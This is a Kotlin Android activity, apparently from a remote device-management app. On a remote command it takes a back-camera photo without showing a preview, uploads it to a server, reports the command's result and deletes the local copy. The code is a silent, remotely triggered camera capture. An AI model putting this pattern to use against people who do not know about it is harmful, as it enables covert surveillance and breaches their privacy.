package com.example.service

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import com.example.DeviceManagerApp
import kotlinx.coroutines.launch
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class CameraCaptureActivity : ComponentActivity() {
    private lateinit var cameraExecutor: ExecutorService

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        cameraExecutor = Executors.newSingleThreadExecutor()

        val commandId = intent.getStringExtra("command_id") ?: ""

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e("CameraCapture", "Camera permission not granted")
            reportFailure(commandId, "Camera permission not granted on device")
            finish()
            return
        }

        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()
                val imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA

                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture)

                val file = File(cacheDir, "camera_capture_${System.currentTimeMillis()}.jpg")
                val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()

                imageCapture.takePicture(
                    outputOptions,
                    ContextCompat.getMainExecutor(this),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                            Log.d("CameraCapture", "Photo captured successfully: ${file.absolutePath}")
                            val app = application as DeviceManagerApp
                            app.repository.scope.launch {
                                val success = app.repository.uploadGenericFile(file, "/uploads/camera_${file.name}")
                                if (success) {
                                    app.repository.reportCommandSuccess(commandId, "Real photo captured successfully as ${file.name}")
                                    app.repository.syncFilesList()
                                } else {
                                    app.repository.reportCommandFailure(commandId, "Photo captured but upload failed")
                                }
                                file.delete()
                                finish()
                            }
                        }

                        override fun onError(exception: ImageCaptureException) {
                            Log.e("CameraCapture", "Photo capture failed: ${exception.message}")
                            reportFailure(commandId, "Photo capture failed: ${exception.message}")
                            finish()
                        }
                    }
                )

            } catch (e: Exception) {
                Log.e("CameraCapture", "Camera binding failed: ${e.message}")
                reportFailure(commandId, "Camera initialization failed: ${e.message}")
                finish()
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun reportFailure(commandId: String, msg: String) {
        val app = application as DeviceManagerApp
        app.repository.scope.launch {
            app.repository.reportCommandFailure(commandId, msg)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        cameraExecutor.shutdown()
    }
}
